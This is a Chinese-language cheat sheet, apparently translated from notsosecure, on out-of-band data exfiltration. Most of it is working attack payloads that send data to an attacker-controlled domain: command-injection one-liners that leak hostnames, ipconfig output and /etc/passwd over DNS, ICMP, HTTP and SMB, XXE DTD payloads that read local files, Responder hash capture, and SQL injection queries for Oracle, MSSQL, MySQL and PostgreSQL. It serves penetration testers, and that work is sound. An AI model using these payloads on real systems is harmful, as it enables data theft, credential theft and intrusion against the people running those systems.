****

## 简介

**带外数据（OOB）是一种通过其他传输方式来窃取数据的技术（例如利用DNS解析协议和电子邮件）。OOB技术通常需要易受攻击的实体生成出站TCP/UDP/ICMP请求，然后允许攻击者泄露数据。OOB攻击的成功基于出口防火墙规则，即是否允许来自易受攻击的系统和外围防火墙的出站请求。而从域名服务器（DNS）中提取数据，则被认为是最隐蔽有效的方法。因此，本文也将重点介绍有关DNS泄露数据的技巧。**

> **引发DNS请求**
>
> 成功利用DNS从有漏洞的数据库中渗出数据的前提条件是，DBMS中有可用的能直接或间接引发DNS解析过程的子程序。
> 然后这类的子程序被攻击者利用，作为攻击的媒介。
>
> 任何可以接受网络地址的函数是最有可能被利用来进行这种攻击的。

 **注：** 出于本文目的，我们尽可能的将用于受害者的payloads以最小依赖性和权限保持为单行。

## 设置：DNS/OOB查询基础架构

###  **先决条件**

> 1\. 具有静态IP地址的公共服务器：出于演示目的，我们将使用由Google云平台（GCP）提供的VPS服务。
>
> 2\. 注册域：访问已注册的域设置，将权限委派给域名服务器。这里我们将使用oob.dnsattacker.com进行DNS解析。

###  **具体步骤**

我们使用Google Cloud
Platform（GCP）创建具有静态IP地址的Linux机器。请确保你在服务器上具有root权限。如果你之前并没有任何有关GCP的创建经验，那么请参照[本指南](https://medium.com/google-cloud/creating-a-virtual-machine-in-google-cloud-platform-ec2d74dbbab0)进行创建。

![信息外带漏洞\(OOB\)利用技巧](https://image.3001.net/images/20180911/1536629609_5b971b69e8889.png!small)

我们在注册商的DNS设置中，为我们的域添加了两条记录。使用NameServer定义了一个子域，以及为nameserver定义了A记录（我们GCP服务器的IP）。现在，这些设置将子域的所有DNS请求都路由到了我们的GCP服务器上。

![信息外带漏洞\(OOB\)利用技巧](https://image.3001.net/images/20180911/1536629626_5b971b7a299bb.png!small)

我们可以使用tcpdump来观察服务器上的DNS查询情况。

![信息外带漏洞\(OOB\)利用技巧](https://image.3001.net/images/20180911/1536629639_5b971b8756c19.png!small)

## 系统命令注入：OOB

我们可以通过解析DNS名称并查找关联的DNS查询，来检测Web应用程序中的操作系统代码注入漏洞。

###  **检测**

 **DNS**

攻击者：使用Wireshark/tcpdump观察53端口的响应情况。

    
    
    sudo tcpdump -n port 53

 **注：** 在DNS命令中，我们还可以显式定义用于解析的名称服务器。

 **Windows**

    
    
    nslookup test.oob.dnsattacker.com
    
    
    ping ping.oob.dnsattacker.com

**![信息外带漏洞\(OOB\)利用技巧](https://image.3001.net/images/20180911/1536629691_5b971bbb3ef0e.png!small)**

 **UNIX**

    
    
    host host.oob.dnsattacker.com

![信息外带漏洞\(OOB\)利用技巧](https://image.3001.net/images/20180911/1536629709_5b971bcd4c91a.png!small)

同样，我们可以使用：

    
    
    dig test.oob.dnsattacker.com
    ping test.oob.dnsattacker.com
    nslookup test.oob.dnsattacker.com

### 利用/渗出

 **DNS**

 **注：** 使用Wireshark/tcpdump观察53端口的响应情况。

    
    
    tcpdump -n port 53

 **Windows**

受害者：

    
    
    cmd /v /c "hostname > temp && certutil -encode temp temp2 && findstr /L /V "CERTIFICATE" temp2 > temp3 && set /p MYVAR=<temp3 && set FINAL=!MYVAR!.oob.dnsattacker.com && nslookup !FINAL!"

攻击者：

    
    
    echo “encoded output” |base64 -d  # decode the output with base64

**![7.png](https://image.3001.net/images/20180911/1536629736_5b971be894844.png!small)**

使用多行发送输出

受害者

    
    
    cmd /v /c "ipconfig > output && certutil -encodehex -f output output.hex 4 && powershell $text=Get-Content output.hex;$subdomain=$text.replace(' ','');$j=11111;foreach($i in $subdomain){ $final=$j.tostring()+'.'+$i+'.file.oob.dnsattacker.com';$j += 1; nslookup $final }"    # Sending file in HEX

攻击者

    
    
    sudo tcpdump -n port 53 | tee file.txt

提取和构建输出：

    
    
    echo "0x$(cat file.txt |tr ' ' '\n' |awk '/file.oob.dnsattacker.com/ {print $1}'|sort -u| cut -d '.' -f 2|tr -d '\n')" | xxd -r -p

**![8.png](https://image.3001.net/images/20180911/1536629766_5b971c06c0cb5.png!small)**

限制条件：需要Powershell。

 **Unix**

受害者：

    
    
    var=11111 && for b in $(ifconfig|xxd -p ); do var=$((var+1)) && dig  $var.$b.file.oob.dnsattacker.com; done   # Sending file in HEX

攻击者：

    
    
    sudo tcpdump -n port 53 | tee file.txt

提取和构建输出：

    
    
    echo "0x$(cat file.txt |tr ' ' '\n' |awk '/file.oob.dnsattacker.com/ {print $1}'|sort -u| cut -d '.' -f 2|tr -d '\n')" | xxd -r -p

![信息外带漏洞\(OOB\)利用技巧](https://image.3001.net/images/20180911/1536629792_5b971c20aa1f9.png!small)

与十六进制编码相比，Base64编码文件会小很多。

受害者：

    
    
    var=11111 && for i in $(ifconfig|base64|awk '{gsub(/.{50}/,"&\n")}1'); do var=$((var+1)) && nslookup $var.$i.file.oob.dnsattacker.com; done# Sending file in base64

攻击者：

    
    
    cat file2.txt |tr ' ' '\n' |awk '/file.oob.dnsattacker.com/ {print $1}'|sort -u| cut -d '.' -f 2|tr -d '\n'|base64 -d    # Extracting Output

![信息外带漏洞\(OOB\)利用技巧](https://image.3001.net/images/20180911/1536629818_5b971c3ab5d9c.png!small)

### ICMP

 **Windows**

受害者

    
    
    cmd /v /c "ipconfig > output.txt && powershell $text=Get-Content output.txt;$ICMPClient = New-Object System.Net.NetworkInformation.Ping;$PingOptions = New-Object System.Net.NetworkInformation.PingOptions;$PingOptions.DontFragment = $True;$sendbytes = ([text.encoding]::ASCII).GetBytes($text);$ICMPClient.Send('dnsattacker.com',60 * 1000, $sendbytes, $PingOptions);

攻击者

    
    
    sudo tcpdump 'icmp and src host 202.14.120.xx' -w powericmp.pcap  #To capture

提取数据：

    
    
    echo "0x$(tshark -n -q -r powericmp.pcap -T fields -e data.data | tr -d '\n' | tr -d ':')" | xxd -r -p   #Or Use Wireshark gui

**![信息外带漏洞\(OOB\)利用技巧](https://image.3001.net/images/20180911/1536629847_5b971c57ea468.png!small)**

限制条件：需要Powershell。

 **Unix**

受害者：

    
    
    cat /etc/passwd | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 dnsattacker.com;don

攻击者：

    
    
    sudo tcpdump  'icmp and src host 202.14.120.xx' -w icmp_file.pcap#To capture

提取数据：

    
    
    echo "0x$(tshark -n -q -r icmp_file.pcap -T fields -e data.data | tr -d '\n' | tr -d ':')" | xxd -r -p   #Or Use Wireshark gui

##
![信息外带漏洞\(OOB\)利用技巧](https://image.3001.net/images/20180911/1536629878_5b971c76723bd.png!small)

### HTTP

 **Windows**

受害者：

    
    
    cmd /v /c "ipconfig > temp && certutil -f -encodehex temp output.hex 12 && set /p MYVAR=<output.hex && set FINAL="http://dnsattacker.com:9000/!MYVAR!" && powershell Invoke-WebRequest !FINAL!"

 **注：** 如果PowerShell不可用，请使用“mshta !Final!”。

攻击者：

    
    
    echo "0x$(ncat -lvp 9000 |grep -i get|tr -d '/' |cut -d ' ' -f2)" |xxd -r -p

**![信息外带漏洞\(OOB\)利用技巧](https://image.3001.net/images/20180911/1536629909_5b971c951a8f7.png!small)**

 **Unix**

受害者：

    
    
    wget --header=evil:$(ifconfig|xxd -p -c 100000) http://dnsattacker.com:9000

攻击者：

    
    
    echo "0x$(ncat -lvp 9000 |grep -i evil|tr -d '/' |cut -d ' ' -f2)" |xxd -r -p

![信息外带漏洞\(OOB\)利用技巧](https://image.3001.net/images/20180911/1536629934_5b971cae895a1.png!small)

同样，我们可以使用：

    
    
    wget –post-data exfil='cat /etc/passwd' http://dnsattacker.com           # extract data  in post section
    
    wget –post-file trophy.php http://dnsattacker.com    # extract source code
    
    cat /path/to/sensitive.txt | curl –F ":data=@-" http://dnsattacker.com/test.txt

### SMB [使用Responder窃取哈希]

 **Windows**

受害者

    
    
    net use h: \\dnsattacker.com\web

攻击者

    
    
    sudo ./Responder.py -I eth0#Run responder to capture hashes

![信息外带漏洞\(OOB\)利用技巧](https://image.3001.net/images/20180911/1536629964_5b971cccb6bd5.png!small)

同样，我们可以使用：

    
    
    net use h: \\dnsattacker.com\web /user: {password} && copy {file.txt to Copy} h:\{file.txt}.txt

## XXE：Out of Band

###  **检测**

我们可以通过向攻击者域（即oob.dnsattacker.com）创建DNS请求来确认XXE漏洞是否存在。这里有一个非常好的[XML实体利用的练习框架](https://pentesterlab.com/exercises/play_xxe)推荐给大家。

受害者：

    
    
    <?xml version="1.0"?>
    <!DOCTYPE foo SYSTEM "http://xxeoob.oob.dnsattacker.com">
    <foo>&ampe1</foo>

攻击者：

    
    
    sudo tcpdump -n udp port 53

**![信息外带漏洞\(OOB\)利用技巧](https://image.3001.net/images/20180911/1536630003_5b971cf3de464.png!small)**

 **限制：** 在撰写本文时，DNS查询仅能用于XXE的检测。

### 利用/渗出

 **HTTP**

攻击者：运行python HTTP server来托管dtd文件。

    
    
    python -m SimpleHttpServer 9000

受害者：

    
    
    <?xml version="1.0" ?>
    <!DOCTYPE r [
    <!ELEMENT r ANY >
    <!ENTITY % sp SYSTEM "http://dnsattacker.com:9000/linux.dtd">
    %sp;
    %param1;
    ]>
    <r>&ampexfil</r>

 **linux.dtd**

    
    
    <!ENTITY % data SYSTEM "file:///etc/passwd">
    <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://dnsattacker.com:9000/%data;'>">

**![信息外带漏洞\(OOB\)利用技巧](https://image.3001.net/images/20180911/1536630039_5b971d17c1be1.png!small)**

 **注：** 对基于Windows的受害者机器，请使用以下dtd文件。

 **windows.dtd**

    
    
    <!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
    <!ENTITY % param1 "<!ENTITY exfil SYSTEM ' http://dnsattacker.com:9000/%data;'>"> 

### FTP

攻击者：

运行python HTTP server来托管dtd文件以及xxeftp
server（请参考[此处](https://gist.github.com/staaldraad/280f167f5cb49a80b4a3)）。

    
    
    python -m SimpleHttpServer 9000
    
    python xxeftp.py

受害者：

    
    
    <?xml version="1.0" ?>
    <!DOCTYPE r [
    <!ELEMENT r ANY >
    <!ENTITY % sp SYSTEM "http://dnsattacker.com:9000/linux.dtd">
    %sp;
    %param1;
    ]>
    <r>&ampexfil</r>

 **linux.dtd**

    
    
    <!ENTITY % data SYSTEM "file:///etc/passwd">
    <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://dnsattacker.com:2121/%data;'>">

**![信息外带漏洞\(OOB\)利用技巧](https://image.3001.net/images/20180911/1536630079_5b971d3fd57e0.png!small)**

 **注：** 对基于Windows的受害者机器，请使用以下dtd文件。

 **windows.dtd**

    
    
    <!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
    <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://dnsattacker.com:2121/%data;'>">

### SMB [窃取哈希]

攻击者：运行responder捕获哈希值

    
    
    sudo ./Responder.py -I eth0

受害者：

    
    
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "\\dnsattacker.com\test" >]>
    <foo>&ampxxe</foo>

 **注：** 出于演示目的，我们将使用CVE-2018-0878：Windows远程协助信息泄露漏洞。

![信息外带漏洞\(OOB\)利用技巧](https://image.3001.net/images/20180911/1536630118_5b971d660da4f.png!small)

类似地，其他可能泄露数据的payloads

    
    
    http://oob.dnsattacker.com:port/%data
    ftp://oob.dnsattacker.com:port/%data
    gopher://oob.dnsattacker.com:port/%data%
    ldap://oob.dnsattacker.com:port
    \\oob.dnsattacker.com\\C$\\1.txt

## SQL注入

 **注：** 所有数据库服务器都安装在Windows上。有关SQL Injection cheat
sheets请参考[[1](http://pentestmonkey.net/category/cheat-sheet/sql-injection)][[2](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)]

### 检测

 **DNS**

攻击者：使用Wireshark/tcpdump观察53端口响应情况。

    
    
    sudo tcpdump -n port 53

##  **ORACLE**

###  **检测**

受害者

    
    
    SELECT DBMS_LDAP.INIT((‘oob.dnsattacker.com',80) FROM DUAL;

**![信息外带漏洞\(OOB\)利用技巧](https://image.3001.net/images/20180911/1536630151_5b971d8769f64.png!small)**

 **注：** 上述功能需要更高的权限才能调用。

### 利用/渗出

 **受害者**

    
    
    SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.attacker.com',80) FROM dual;    /* Extracting Oracle database version */

![信息外带漏洞\(OOB\)利用技巧](https://image.3001.net/images/20180911/1536630182_5b971da6a1e4c.png!small)

同样，我们可以使用以下payloads。

 **受害者**

    
    
    SELECT DBMS_LDAP.INIT((SELECT user FROM dual)||'.attacker.com',80) FROM dual;      /*Extracting Current user in Oracle database */

如果你使用的Oracle为10G或更低版本，则可以使用一些替代方法来创建DNS查询：UTL_INADDR.GET_HOST_ADDRESS,
UTL_HTTP.REQUEST, HTTP_URITYPE.GETCLOB, DBMS_LDAP.INIT and UTL_TCP。

##  **MSSQL**

###  **检测**

 **受害者**

    
    
    EXEC master..xp_dirtree '\\oob.dnsattacker.com \' –

##
![信息外带漏洞\(OOB\)利用技巧](https://image.3001.net/images/20180911/1536630213_5b971dc56df6b.png!small)

### 利用/渗出

 **受害者**

    
    
    DECLARE @data varchar(1024);
    SELECT @data = (SELECT system_user);  
    EXEC('master..xp_dirtree "\\'+@data+'.oob.dnsattacker.com\foo$"');

**![信息外带漏洞\(OOB\)利用技巧](https://image.3001.net/images/20180911/1536630249_5b971de9e1b13.png!small)**

 **限制条件：** 数据库用户须为sysadmin权限。

类似地，创建DNS查询的其他方法包括：xp_fileexists，xp_subdirs，xp_getfiledetails，sp_add_jobstep

## MYSQL

###  **检测**

 **受害者**

    
    
    SELECT LOAD_FILE(CONCAT('\\\\', 'oob.dnsattacker.com\\test.txt'));

##
![信息外带漏洞\(OOB\)利用技巧](https://image.3001.net/images/20180911/1536630280_5b971e0801570.png!small)

### 利用/渗出

 **受害者**

    
    
    SELECT LOAD_FILE(CONCAT('\\\\', (SELECT HEX(CONCAT(user(),"\n"))), '.oob.dnsattacker.com\\test.txt'));

 **限制条件：** 数据库用户须具有Select，update和“文件”权限。

![信息外带漏洞\(OOB\)利用技巧](https://image.3001.net/images/20180911/1536630369_5b971e6170ead.png!small)

## Postgresql

 **检测**

 **受害者**

    
    
    CREATE EXTENSION dblink;SELECT dblink_connect('host=oob.dnsattacker.com user=postgres password=password dbname=dvdrental');

**![信息外带漏洞\(OOB\)利用技巧](https://image.3001.net/images/20180911/1536630396_5b971e7c06c88.png!small)**

 **限制条件：** 用户必须具有超级用户权限才能执行CREATE EXTENSION查询。

### 利用/渗出

 **受害者**

    
    
    DROP TABLE IF EXISTS table_output;
    CREATE TABLE table_output(content text);
    CREATE OR REPLACE FUNCTION temp_function()
    RETURNS VOID AS $$
    DECLARE exec_cmd TEXT;
    DECLARE query_result TEXT;
    BEGIN
        SELECT INTO query_result (SELECT encode(convert_to(concat(user,'     '), 'UTF8'),'hex'));
        exec_cmd := E'COPY table_output(content) FROM E\'\\\\\\\\'||query_result||E'.oob.dnsattacker.com\\\\foobar.txt\'';
        EXECUTE exec_cmd;
    END;
    $$ LANGUAGE plpgsql SECURITY DEFINER;
    SELECT temp_function();

##
![信息外带漏洞\(OOB\)利用技巧](https://image.3001.net/images/20180911/1536630425_5b971e9941425.png!small)

## 使用DNS泄露数据的限制

> 域名最多可包含127个子域。
>
> 每个子域最多只能包含63个字符长度。
>
> 完整域名的最大长度为253个字符。
>
> DNS记录缓存为每个URL请求都添加了一个唯一值。
>
> DNS是明文通道，因此通过DNS提取的任何数据都将采用明文格式，并可供中间节点和DNS服务器缓存使用。因此，建议不要通过DNS泄露一些较为敏感的数据。

相关参考

> <https://github.com/beefproject/beef/wiki/Installation>
>
> <https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/>
>
> <https://www.youtube.com/watch?v=COVtU5G0Iys>
>
> <https://github.com/Arno0x/DNSExfiltrator>
>
> <https://blog.zsec.uk/out-of-band-xxe-2/>
>
> <https://github.com/api0cradle/Powershell-ICMP/blob/master/Powershell-ICMP-> Sender.ps1>
>
> <https://github.com/lukebaggett/dnscat2-powershell/blob/master/dnscat2.ps1>
>
> <https://ss64.com/nt/certutil.html>
>
>
> <https://isc.sans.edu/forums/diary/Exfiltrating+data+from+very+isolated+environments/23645/>
>
> <https://pentest.blog/data-ex-filtration-with-dns-in-sqli-attacks/>
>
> <https://www.aldeid.com/wiki/File-transfer-via-DNS>
>
> <https://www.dbrnd.com/2015/05/postgresql-cross-database-queries-using/>

** *****参考来源：[notsosecure](https://www.notsosecure.com/oob-exploitation-cheatsheet/) ， FB小编 secist 编译，转载请注明来自FreeBuf.COM**

